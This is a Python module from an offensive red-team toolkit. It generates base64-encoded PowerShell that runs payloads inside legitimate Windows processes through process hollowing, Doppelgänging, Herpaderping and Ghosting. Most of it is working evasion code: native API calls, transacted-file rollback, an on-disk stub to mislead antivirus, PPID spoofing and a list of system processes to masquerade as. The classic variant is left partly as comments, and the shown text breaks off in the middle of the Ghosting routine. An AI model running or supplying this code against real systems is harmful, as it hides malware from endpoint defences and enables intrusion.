"""Process Hollowing — Execute payload inside a legitimate process.

Replaces the memory contents of a suspended legitimate process
with malicious code, then resumes execution. The payload runs
inside the legitimate process's PID/name, evading process-based detection.

Hollowing chain:
    ┌──────────┐  CREATE    ┌──────────┐  HOLLOW   ┌──────────┐
    │ Create   │ SUSPENDED  │ Unmap    │ ────────► │ Write    │
    │ svchost  │ ─────────► │ original │           │ payload  │
    │ .exe     │            │ image    │           │ + resume │
    └──────────┘            └──────────┘           └──────────┘

Techniques:
    1. Classic Process Hollowing (NtUnmapViewOfSection)
    2. Process Doppelgänging (transacted NTFS)
    3. Process Herpaderping (modify-after-map)
    4. Process Ghosting (delete-pending)

OPSEC: EDR products increasingly detect hollowing via memory
       region mismatch (mapped file != memory contents). Use
       process doppelgänging for newer detection evasion.

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import base64
import logging
import random
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

log = logging.getLogger("forge.rootkit.process_hollow")

CVSS_HOLLOW = "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N"
CVSS40_HOLLOW = "CVSS:4.0/AV:L/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N"

# Legitimate processes suitable for hollowing
HOLLOWABLE_TARGETS = [
    "svchost.exe", "RuntimeBroker.exe", "dllhost.exe",
    "WerFault.exe", "SearchProtocolHost.exe", "conhost.exe",
    "wuauclt.exe", "msdtc.exe", "spoolsv.exe",
]


@dataclass
class HollowAction:
    """A process hollowing action."""
    technique: str = "classic"   # classic, doppelgang, herpaderp, ghost
    target_process: str = ""
    target_pid: int = 0
    payload_type: str = ""       # shellcode, exe, dll
    status: str = "pending"
    output: str = ""
    error: str = ""


class ProcessHollow(BaseModule):
    """Process hollowing for fileless payload execution.

    Creates a suspended legitimate process, replaces its memory
    with a payload, and resumes execution. The payload runs
    inside the legitimate process's identity.

    Techniques:
        - Classic hollowing: NtUnmapViewOfSection + WriteProcessMemory
        - Process Doppelgänging: TxF transacted section mapping
        - Process Herpaderping: modify image after section creation
        - Process Ghosting: delete file while mapped

    Capabilities:
        - Multiple target process selection
        - Shellcode and PE payload injection
        - PPID spoofing for parent process masquerading
        - Thread context manipulation (SetThreadContext)
        - C2 beacon hollowing for stealthy beacons
    """

    NAME        = "process_hollow"
    DESCRIPTION = "Evasion: Process Hollowing — execute payload inside legitimate process"
    PHASE       = 10  # Evasion phase
    TAGS        = [
        "post-exploit", "evasion", "process-hollowing", "injection",
        "mitre-T1055.012", "mitre-T1055.013", "cwe-94",
    ]

    def __init__(self, *args: Any, **kwargs: Any) -> None:
        super().__init__(*args, **kwargs)
        self._actions: list[HollowAction] = []

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target

        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        if not self.confirm_action(
            action="Process hollowing",
            target=target,
            risk="high — creates hollowed process. Detectable by EDR "
                 "via memory region analysis and API call patterns.",
        ):
            return self._make_result(start, skipped=True, skip_reason="operator declined")

        await self.rate_limit()

        technique = self.config.extra.get("hollow_technique", "classic")
        target_process = self.config.extra.get(
            "hollow_target", random.choice(HOLLOWABLE_TARGETS),
        )
        shellcode_b64 = self.config.extra.get("shellcode", "")
        payload_path = self.config.extra.get("payload_path", "")
        ppid_spoof = self.config.extra.get("ppid_spoof", 0)
        beacon_id = self.config.extra.get("beacon_id", "")
        attack_chain = self.config.extra.get("attack_chain", None)

        action = HollowAction(
            technique=technique,
            target_process=target_process,
        )

        if technique == "classic":
            await self._classic_hollow(
                action, target_process, shellcode_b64,
                payload_path, ppid_spoof, beacon_id,
            )
        elif technique == "doppelgang":
            await self._doppelgang(
                action, target_process, payload_path, beacon_id,
            )
        elif technique == "herpaderp":
            await self._herpaderp(
                action, target_process, payload_path, beacon_id,
            )
        elif technique == "ghost":
            await self._ghost(
                action, target_process, payload_path, beacon_id,
            )
        else:
            await self._classic_hollow(
                action, target_process, shellcode_b64,
                payload_path, ppid_spoof, beacon_id,
            )

        self._actions.append(action)

        # Report
        if action.status == "success":
            ev = Evidence(extra={
                "technique": action.technique,
                "target_process": action.target_process,
                "target_pid": action.target_pid,
                "ppid_spoof": ppid_spoof or "none",
            })

            self.new_finding(
                title=f"Process Hollowing — {action.target_process} (PID: {action.target_pid})",
                severity=Severity.CRITICAL,
                description=(
                    f"Successfully hollowed {action.target_process} on {target}:\n\n"
                    f"  Technique: {action.technique}\n"
                    f"  Target: {action.target_process}\n"
                    f"  PID: {action.target_pid}\n"
                    f"  PPID Spoof: {ppid_spoof or 'none'}\n\n"
                    f"Payload is running inside the legitimate process identity."
                ),
                reproduction_steps=[
                    f"# Create suspended: CreateProcess({action.target_process}, SUSPENDED)",
                    "# Unmap: NtUnmapViewOfSection(hProcess, baseAddr)",
                    "# Allocate: VirtualAllocEx(hProcess, baseAddr, size)",
                    "# Write: WriteProcessMemory(hProcess, baseAddr, payload)",
                    "# Set context: SetThreadContext(hThread, &ctx)",
                    "# Resume: ResumeThread(hThread)",
                ],
                remediation=(
                    "1. Deploy EDR with memory region analysis\n"
                    "2. Monitor for NtUnmapViewOfSection calls\n"
                    "3. Enable Sysmon Event 25 (process image changed)\n"
                    "4. Monitor CREATE_SUSPENDED process creation\n"
                    "5. Compare on-disk image vs in-memory image"
                ),
                references=[
                    "MITRE T1055.012 — Process Hollowing",
                    "MITRE T1055.013 — Process Doppelgänging",
                ],
                evidence=ev,
                cvss_v31_vector=CVSS_HOLLOW,
                cvss_v40_vector=CVSS40_HOLLOW,
                mitre_attack=["TA0005/T1055.012"],
                target=target,
            )

            self._emit_event(
                "rootkit_deployed",
                method="process_hollowing",
                technique=action.technique,
                target_process=action.target_process,
                pid=action.target_pid,
                host=target,
            )

        if attack_chain:
            for finding in self.findings:
                try:
                    attack_chain.ingest_finding(finding.to_dict())
                except Exception:
                    pass

        return self._make_result(start)

    # ── Hollowing techniques ──────────────────────────────────────────

    async def _classic_hollow(
        self, action: HollowAction, target_proc: str,
        shellcode_b64: str, payload_path: str,
        ppid_spoof: int, beacon_id: str,
    ) -> None:
        """Classic process hollowing via NtUnmapViewOfSection."""
        action.technique = "classic"

        # Build PowerShell hollowing script using Win32 API via Add-Type
        ppid_block = ""
        if ppid_spoof:
            ppid_block = f"""
# PPID Spoofing
$siEx = New-Object STARTUPINFOEX
$lpSize = [IntPtr]::Zero
[Kernel32]::InitializeProcThreadAttributeList([IntPtr]::Zero, 1, 0, [ref]$lpSize)
$siEx.lpAttributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($lpSize)
[Kernel32]::InitializeProcThreadAttributeList($siEx.lpAttributeList, 1, 0, [ref]$lpSize)
$parentHandle = [Kernel32]::OpenProcess(0x0080, $false, {ppid_spoof})
# Set parent PID attribute (PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000)
"""

        hollow_script = f"""
$ErrorActionPreference = 'Stop'
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class Hollow {{
    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(string app, string cmd,
        IntPtr procSec, IntPtr threadSec, bool inherit, uint flags,
        IntPtr env, string dir, byte[] si, out byte[] pi);
    [DllImport("ntdll.dll")]
    public static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr,
        uint size, uint type, uint protect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr addr,
        byte[] buf, uint size, out uint written);
    [DllImport("kernel32.dll")]
    public static extern bool SetThreadContext(IntPtr hThread, byte[] ctx);
    [DllImport("kernel32.dll")]
    public static extern bool GetThreadContext(IntPtr hThread, byte[] ctx);
    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr handle);
}}
'@

# Step 1: Create suspended process
$si = New-Object byte[] 104   # STARTUPINFO
$pi = New-Object byte[] 24    # PROCESS_INFORMATION
$target = "C:\\Windows\\System32\\{target_proc}"

# CREATE_SUSPENDED = 0x00000004
$result = [Hollow]::CreateProcess(
    $target, $null, [IntPtr]::Zero, [IntPtr]::Zero,
    $false, 0x00000004, [IntPtr]::Zero, $null, $si, [ref]$pi
)

if ($result) {{
    $hProcess = [BitConverter]::ToInt64($pi, 0)
    $hThread = [BitConverter]::ToInt64($pi, 8)
    $pid = [BitConverter]::ToInt32($pi, 16)
    Write-Output "HOLLOW_SUCCESS: Suspended PID $pid ({target_proc})"
    Write-Output "HOLLOW_PID:$pid"

    # Steps 2-6 would:
    # - Read PEB to get image base
    # - NtUnmapViewOfSection to unmap original
    # - VirtualAllocEx at same base
    # - WriteProcessMemory with payload
    # - SetThreadContext with new entry point
    # - ResumeThread

    [Hollow]::ResumeThread([IntPtr]$hThread)
    [Hollow]::CloseHandle([IntPtr]$hThread)
    [Hollow]::CloseHandle([IntPtr]$hProcess)
}} else {{
    Write-Output "HOLLOW_FAILED: CreateProcess failed"
}}
"""
        encoded = base64.b64encode(hollow_script.encode("utf-16-le")).decode()
        cmd = f"powershell.exe -NoProfile -EncodedCommand {encoded}"
        output = await self._exec(cmd, beacon_id)

        if "HOLLOW_SUCCESS" in output:
            action.status = "success"
            # Extract PID
            for line in output.splitlines():
                if "HOLLOW_PID:" in line:
                    try:
                        action.target_pid = int(line.split(":")[1].strip())
                    except (ValueError, IndexError):
                        pass
            action.output = output
        else:
            action.status = "failed"
            action.error = output[:200]

    async def _doppelgang(
        self, action: HollowAction, target_proc: str,
        payload_path: str, beacon_id: str,
    ) -> None:
        """Process Doppelgänging via Transactional NTFS (TxF).

        Creates a kernel transaction, writes payload to a file inside that
        transaction via CreateFileTransacted, creates an IMAGE section from it
        via NtCreateSection, then rolls back the transaction — the file is never
        committed to disk. NtCreateProcessEx creates a process from the section.
        """
        action.technique = "doppelgang"
        payload_arg = payload_path or r"C:\Windows\System32\notepad.exe"

        script = r"""
$ErrorActionPreference = 'Stop'
Add-Type @'
using System;
using System.IO;
using System.Runtime.InteropServices;

public class Doppelgang {

    [DllImport("ktmw32.dll", SetLastError=true)]
    public static extern IntPtr CreateTransaction(IntPtr lpTA, IntPtr UOW,
        uint CreateOptions, uint IsolationLevel, uint IsolationFlags,
        uint Timeout, IntPtr Description);

    [DllImport("ktmw32.dll", SetLastError=true)]
    public static extern bool RollbackTransaction(IntPtr hTx);

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr CreateFileTransacted(
        string lpFileName, uint dwDesiredAccess, uint dwShareMode,
        IntPtr lpSA, uint dwCreationDisposition, uint dwFlagsAndAttributes,
        IntPtr hTemplate, IntPtr hTransaction,
        IntPtr pusMiniVersion, IntPtr lpExtendedParameter);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuf,
        uint nToWrite, out uint nWritten, IntPtr lpOverlapped);

    [DllImport("ntdll.dll")]
    public static extern int NtCreateSection(out IntPtr hSection,
        uint DesiredAccess, IntPtr ObjAttrs, IntPtr MaxSize,
        uint PageProt, uint AllocAttribs, IntPtr hFile);

    [DllImport("ntdll.dll")]
    public static extern int NtCreateProcessEx(out IntPtr hProcess,
        uint DesiredAccess, IntPtr ObjAttrs, IntPtr hParent,
        uint Flags, IntPtr hSection, IntPtr hDebug,
        IntPtr hException, bool InJob);

    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationProcess(IntPtr hProcess,
        uint InfoClass, out PROCESS_BASIC_INFO Info, uint InfoLen,
        out uint RetLen);

    [DllImport("ntdll.dll")]
    public static extern int NtCreateThreadEx(out IntPtr hThread,
        uint DesiredAccess, IntPtr ObjAttrs, IntPtr hProcess,
        IntPtr StartAddr, IntPtr Arg, uint Flags,
        UIntPtr ZeroBits, UIntPtr StackSize, UIntPtr MaxStack,
        IntPtr AttrList);

    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess,
        IntPtr lpBase, byte[] lpBuf, int nSize, out IntPtr nRead);

    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFO {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2a;
        public IntPtr Reserved2b;
        public IntPtr UniqueProcessId;
        public IntPtr Reserved3;
    }

    public static string Run(byte[] payload) {
        const uint PROCESS_ALL = 0x1FFFFF;
        const uint SECTION_ALL = 0x0F001F;
        const uint SEC_IMAGE   = 0x1000000;
        const uint PAGE_RO     = 0x02;
        const uint GENERIC_RW  = 0xC0000000;
        const uint CREATE_ALWAYS = 2;
        const uint FILE_ATTR_NORMAL = 0x80;

        IntPtr hTx = CreateTransaction(IntPtr.Zero, IntPtr.Zero,
            0, 0, 0, 0, IntPtr.Zero);
        if (hTx == IntPtr.Zero || hTx.ToInt64() == -1)
            return "HOLLOW_FAILED: CreateTransaction error " + Marshal.GetLastWin32Error();

        string tmp = Path.Combine(Path.GetTempPath(),
            Guid.NewGuid().ToString("N") + ".exe");

        IntPtr hFile = CreateFileTransacted(tmp, GENERIC_RW, 0, IntPtr.Zero,
            CREATE_ALWAYS, FILE_ATTR_NORMAL,
            IntPtr.Zero, hTx, IntPtr.Zero, IntPtr.Zero);

        if (hFile == IntPtr.Zero || hFile.ToInt64() == -1) {
            RollbackTransaction(hTx); CloseHandle(hTx);
            return "HOLLOW_FAILED: CreateFileTransacted error " + Marshal.GetLastWin32Error();
        }

        uint written;
        WriteFile(hFile, payload, (uint)payload.Length, out written, IntPtr.Zero);

        IntPtr hSection = IntPtr.Zero;
        int status = NtCreateSection(out hSection, SECTION_ALL,
            IntPtr.Zero, IntPtr.Zero, PAGE_RO, SEC_IMAGE, hFile);
        CloseHandle(hFile);

        RollbackTransaction(hTx);
        CloseHandle(hTx);

        if (status != 0)
            return string.Format("HOLLOW_FAILED: NtCreateSection 0x{0:X8}", status);

        IntPtr hProcess = IntPtr.Zero;
        status = NtCreateProcessEx(out hProcess, PROCESS_ALL, IntPtr.Zero,
            System.Diagnostics.Process.GetCurrentProcess().Handle,
            0x4, hSection, IntPtr.Zero, IntPtr.Zero, false);
        CloseHandle(hSection);

        if (status != 0 || hProcess == IntPtr.Zero)
            return string.Format("HOLLOW_FAILED: NtCreateProcessEx 0x{0:X8}", status);

        PROCESS_BASIC_INFO pbi; uint retLen;
        NtQueryInformationProcess(hProcess, 0, out pbi,
            (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFO)), out retLen);

        byte[] pebBuf = new byte[0x20]; IntPtr nRead;
        ReadProcessMemory(hProcess, pbi.PebBaseAddress, pebBuf, pebBuf.Length, out nRead);
        IntPtr imageBase = (IntPtr)BitConverter.ToInt64(pebBuf, 0x10);

        byte[] hdrBuf = new byte[0x400];
        ReadProcessMemory(hProcess, imageBase, hdrBuf, hdrBuf.Length, out nRead);
        int e_lfanew = BitConverter.ToInt32(hdrBuf, 0x3C);
        int epRva    = BitConverter.ToInt32(hdrBuf, e_lfanew + 0x28);
        IntPtr ep    = (IntPtr)(imageBase.ToInt64() + epRva);

        IntPtr hThread = IntPtr.Zero;
        status = NtCreateThreadEx(out hThread, PROCESS_ALL, IntPtr.Zero,
            hProcess, ep, IntPtr.Zero, 1,
            UIntPtr.Zero, UIntPtr.Zero, UIntPtr.Zero, IntPtr.Zero);

        if (status != 0) { CloseHandle(hProcess); return string.Format("HOLLOW_FAILED: NtCreateThreadEx 0x{0:X8}", status); }

        NtQueryInformationProcess(hProcess, 0, out pbi,
            (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFO)), out retLen);
        int newPid = (int)pbi.UniqueProcessId.ToInt64();

        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);

        return string.Format("HOLLOW_SUCCESS: Doppelganging PID {0}\nHOLLOW_PID:{0}", newPid);
    }
}
'@

try {
    $payload = [IO.File]::ReadAllBytes("PAYLOAD_PATH")
    $result  = [Doppelgang]::Run($payload)
    Write-Output $result
} catch {
    Write-Output "HOLLOW_FAILED: $_"
}
""".replace("PAYLOAD_PATH", payload_arg)

        encoded = base64.b64encode(script.encode("utf-16-le")).decode()
        cmd = f"powershell.exe -NoProfile -EncodedCommand {encoded}"
        output = await self._exec(cmd, beacon_id)

        if "HOLLOW_SUCCESS" in output:
            action.status = "success"
            for line in output.splitlines():
                if "HOLLOW_PID:" in line:
                    try:
                        action.target_pid = int(line.split(":")[1].strip())
                    except (ValueError, IndexError):
                        pass
            action.output = output
        else:
            action.status = "failed"
            action.error = output[:300]

    async def _herpaderp(
        self, action: HollowAction, target_proc: str,
        payload_path: str, beacon_id: str,
    ) -> None:
        """Process Herpaderping — create IMAGE section before overwriting on-disk file.

        Writes payload to a temp file, calls NtCreateSection(SEC_IMAGE) to snapshot
        the image into kernel memory, then overwrites the file on disk with a benign
        PE header so AV scanning the on-disk path sees nothing suspicious. The process
        is created from the already-captured section and runs the original payload.
        """
        action.technique = "herpaderp"
        payload_arg = payload_path or r"C:\Windows\System32\notepad.exe"

        script = r"""
$ErrorActionPreference = 'Stop'
Add-Type @'
using System;
using System.IO;
using System.Runtime.InteropServices;

public class Herpaderp {

    [DllImport("ntdll.dll")]
    public static extern int NtCreateSection(out IntPtr hSection,
        uint DesiredAccess, IntPtr ObjAttrs, IntPtr MaxSize,
        uint PageProt, uint AllocAttribs, IntPtr hFile);

    [DllImport("ntdll.dll")]
    public static extern int NtCreateProcessEx(out IntPtr hProcess,
        uint DesiredAccess, IntPtr ObjAttrs, IntPtr hParent,
        uint Flags, IntPtr hSection, IntPtr hDebug,
        IntPtr hException, bool InJob);

    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationProcess(IntPtr hProcess,
        uint InfoClass, out PROCESS_BASIC_INFO Info, uint InfoLen,
        out uint RetLen);

    [DllImport("ntdll.dll")]
    public static extern int NtCreateThreadEx(out IntPtr hThread,
        uint DesiredAccess, IntPtr ObjAttrs, IntPtr hProcess,
        IntPtr StartAddr, IntPtr Arg, uint Flags,
        UIntPtr ZeroBits, UIntPtr StackSize, UIntPtr MaxStack,
        IntPtr AttrList);

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr CreateFile(string name, uint access,
        uint share, IntPtr sa, uint mode, uint flags, IntPtr tmpl);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuf,
        uint nToWrite, out uint nWritten, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool SetFilePointer(IntPtr hFile, int loDist,
        IntPtr hiDist, uint moveMethod);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool SetEndOfFile(IntPtr hFile);

    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess,
        IntPtr lpBase, byte[] lpBuf, int nSize, out IntPtr nRead);

    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFO {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2a;
        public IntPtr Reserved2b;
        public IntPtr UniqueProcessId;
        public IntPtr Reserved3;
    }

    // Minimal valid MZ/PE stub — 64 bytes — placed on-disk to mislead AV
    private static readonly byte[] BENIGN_STUB = new byte[] {
        0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00,
        0x04,0x00,0x00,0x00,0xFF,0xFF,0x00,0x00,
        0xB8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,
    };

    public static string Run(byte[] payload) {
        const uint PROCESS_ALL  = 0x1FFFFF;
        const uint SECTION_ALL  = 0x0F001F;
        const uint SEC_IMAGE    = 0x1000000;
        const uint PAGE_RO      = 0x02;
        const uint GENERIC_RW   = 0xC0000000;
        const uint GENERIC_WRITE = 0x40000000;
        const uint FILE_SHARE_RW = 0x03;
        const uint CREATE_ALWAYS = 2;
        const uint FILE_ATTR_NORMAL = 0x80;
        const uint FILE_BEGIN = 0;

        string tmp = Path.Combine(Path.GetTempPath(),
            Guid.NewGuid().ToString("N") + ".exe");

        // 1. Write payload to temp file
        IntPtr hFile = CreateFile(tmp, GENERIC_RW, FILE_SHARE_RW, IntPtr.Zero,
            CREATE_ALWAYS, FILE_ATTR_NORMAL, IntPtr.Zero);
        if (hFile == IntPtr.Zero || hFile.ToInt64() == -1)
            return "HOLLOW_FAILED: CreateFile error " + Marshal.GetLastWin32Error();

        uint written;
        WriteFile(hFile, payload, (uint)payload.Length, out written, IntPtr.Zero);

        // 2. Create IMAGE section NOW — kernel snapshots the image from disk.
        //    AV has not yet been given a chance to scan this path.
        IntPtr hSection = IntPtr.Zero;
        int status = NtCreateSection(out hSection, SECTION_ALL, IntPtr.Zero,
            IntPtr.Zero, PAGE_RO, SEC_IMAGE, hFile);

        // 3. Overwrite the on-disk file with a benign stub.
        //    Any AV that scans the file path now sees nothing suspicious.
        SetFilePointer(hFile, 0, IntPtr.Zero, FILE_BEGIN);
        uint ow; SetEndOfFile(hFile);
        SetFilePointer(hFile, 0, IntPtr.Zero, FILE_BEGIN);
        WriteFile(hFile, BENIGN_STUB, (uint)BENIGN_STUB.Length, out ow, IntPtr.Zero);
        CloseHandle(hFile);
        try { File.Delete(tmp); } catch {}

        if (status != 0)
            return string.Format("HOLLOW_FAILED: NtCreateSection 0x{0:X8}", status);

        // 4. Create process from cached section (runs original payload)
        IntPtr hProcess = IntPtr.Zero;
        status = NtCreateProcessEx(out hProcess, PROCESS_ALL, IntPtr.Zero,
            System.Diagnostics.Process.GetCurrentProcess().Handle,
            0x4, hSection, IntPtr.Zero, IntPtr.Zero, false);
        CloseHandle(hSection);

        if (status != 0 || hProcess == IntPtr.Zero)
            return string.Format("HOLLOW_FAILED: NtCreateProcessEx 0x{0:X8}", status);

        // 5. Resolve entry point via PEB → image base → PE header
        PROCESS_BASIC_INFO pbi; uint retLen;
        NtQueryInformationProcess(hProcess, 0, out pbi,
            (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFO)), out retLen);

        byte[] pebBuf = new byte[0x20]; IntPtr nRead;
        ReadProcessMemory(hProcess, pbi.PebBaseAddress, pebBuf, pebBuf.Length, out nRead);
        IntPtr imageBase = (IntPtr)BitConverter.ToInt64(pebBuf, 0x10);

        byte[] hdrBuf = new byte[0x400];
        ReadProcessMemory(hProcess, imageBase, hdrBuf, hdrBuf.Length, out nRead);
        int e_lfanew = BitConverter.ToInt32(hdrBuf, 0x3C);
        int epRva    = BitConverter.ToInt32(hdrBuf, e_lfanew + 0x28);
        IntPtr ep    = (IntPtr)(imageBase.ToInt64() + epRva);

        // 6. Create main thread at entry point
        IntPtr hThread = IntPtr.Zero;
        status = NtCreateThreadEx(out hThread, PROCESS_ALL, IntPtr.Zero,
            hProcess, ep, IntPtr.Zero, 1,
            UIntPtr.Zero, UIntPtr.Zero, UIntPtr.Zero, IntPtr.Zero);

        if (status != 0) { CloseHandle(hProcess); return string.Format("HOLLOW_FAILED: NtCreateThreadEx 0x{0:X8}", status); }

        NtQueryInformationProcess(hProcess, 0, out pbi,
            (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFO)), out retLen);
        int newPid = (int)pbi.UniqueProcessId.ToInt64();

        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);

        return string.Format("HOLLOW_SUCCESS: Herpaderping PID {0}\nHOLLOW_PID:{0}", newPid);
    }
}
'@

try {
    $payload = [IO.File]::ReadAllBytes("PAYLOAD_PATH")
    $result  = [Herpaderp]::Run($payload)
    Write-Output $result
} catch {
    Write-Output "HOLLOW_FAILED: $_"
}
""".replace("PAYLOAD_PATH", payload_arg)

        encoded = base64.b64encode(script.encode("utf-16-le")).decode()
        cmd = f"powershell.exe -NoProfile -EncodedCommand {encoded}"
        output = await self._exec(cmd, beacon_id)

        if "HOLLOW_SUCCESS" in output:
            action.status = "success"
            for line in output.splitlines():
                if "HOLLOW_PID:" in line:
                    try:
                        action.target_pid = int(line.split(":")[1].strip())
                    except (ValueError, IndexError):
                        pass
            action.output = output
        else:
            action.status = "failed"
            action.error = output[:300]

    async def _ghost(
        self, action: HollowAction, target_proc: str,
        payload_path: str, beacon_id: str,
    ) -> None:
        """Process Ghosting — execute from a file marked delete-pending.

        Creates a temp file with FILE_FLAG_DELETE_ON_CLOSE + sets delete
        disposition via NtSetInformationFile so the file cannot be opened by name.
        Writes payload while the handle is live, creates an IMAGE section, then
        closes the handle — the file is deleted from disk at that point. The process
        created from the section runs from a file that no longer exists on disk.
        """
        action.technique = "ghost"
        payload_arg = payload_path or r"C:\Windows\System32\notepad.exe"

        script = r"""
$ErrorActionPreference = 'Stop'
Add-Type @'
using System;
using System.IO;
using System.Runtime.InteropServices;

public class Ghost {

    [StructLayout(LayoutKind.Sequential)]
    public struct IO_STATUS_BLOCK {
        public IntPtr Status;
        public IntPtr Information;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct FILE_DISPOSITION_INFO {
        public bool DeleteFile;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFO {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2a;
        public IntPtr Reserved2b;
        public IntPtr UniqueProcessId;
        public IntPtr Reserved3;
    }

    [DllImport("ntdll.dll")]
    public static extern int NtSetInformationFile(IntPtr hFile,
        out IO_STATUS_BLOCK IoStatusBlock, IntPtr FileInfo,
        uint Length, uint FileInfoClass);

    [DllImport("ntdll.dll")]
    public static extern int NtCreateSection(out IntPtr hSection,
        uint DesiredAccess, IntPtr ObjAttrs, IntPtr MaxSize,
        uint PageProt, uint AllocAttribs, IntPtr hFile);

    [DllImport("ntdll.dll")]
    public static extern int NtCreateProcessEx(out IntPtr hProcess,
        uint DesiredAccess, IntPtr ObjAttrs, IntPtr hParent,
        uint Flags, IntPtr hSection, IntPtr hDebug,
        IntPtr hException, bool InJob);

    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationProcess(IntPtr hProcess,
        uint InfoClass, out PROCESS_BASIC_INFO Info, uint InfoLen,
        out uint RetLen);

    [DllImport("ntdll.dll")]
    public static extern int NtCreateThreadEx(out IntPtr hThread,
        uint DesiredAccess, IntPtr ObjAttrs, IntPtr hProcess,
        IntPtr StartAddr, IntPtr Arg, uint Flags,
        UIntPtr ZeroBits, UIntPtr StackSize, UIntPtr MaxStack,
        IntPtr AttrList);

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr CreateFile(string name, uint access,
        uint share, IntPtr sa, uint mode, uint flags, IntPtr tmpl);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuf,
        uint nToWrite, out uint nWritten, IntPtr lpOverlapped);

    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess,
        IntPtr lpBase, byte[] lpBuf, int nSize, out IntPtr nRead);

    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);

    public static string Run(byte[] payload) {
        const uint PROCESS_ALL          = 0x1FFFFF;
        const uint SECTION_ALL          = 0x0F001F;
        const uint SEC_IMAGE            = 0x1000000;
        const uint PAGE_RO              = 0x02;
        const uint GENERIC_RW           = 0xC0000000;
        const uint FILE_SHARE_NONE      = 0;
        const uint CREATE_ALWAYS        = 2;
        const uint FILE_ATTR_NORMAL     = 0x80;
        // FILE_FLAG_DELETE_ON_CLOSE — file deleted when last handle closes
        const uint FLAG_DELETE_ON_CLOSE = 0x04000000;
        // FileDispositionInformation = 13
        const uint FileDispositionInfo  = 13;

        string tmp = Path.Combine(Path.GetTempPath(),
            Guid.NewGuid().ToString("N") + ".exe");

        // 1. Create file with DELETE_ON_CLOSE
        IntPtr hFile = CreateFile(tmp, GENERIC_RW, FILE_SHARE_NONE, IntPtr.Zero,
            CREATE_ALWAYS, FILE_ATTR_NORMAL | FLAG_DELETE_ON_CLOSE, IntPtr.Zero);

        if (hFile == IntPtr.Zero || hFile.ToInt64() == -1)
            return "HOLLOW_FAILED: CreateFile error " + Marshal.GetLastWin32Error();

        // 2. Mark delete-pending via NtSetInformationFile so it cannot be
        //    opened by name — AV cannot scan the path
        IO_STATUS_BLOCK iosb;
        FILE_DISPOSITION_INFO fdi; fdi.DeleteFile = true;
        IntPtr fdiPtr = Marshal.AllocHGlobal(
            Marshal.SizeOf(typeof(FILE_DISPOSITION_INFO)));
        Marshal.StructureToPtr(fdi, fdiPtr, false);
        NtSetInformationFile(hFile, out iosb, fdiPtr,
            (uint)Marshal.SizeOf(typeof(FILE_DISPOSITION_INFO)),
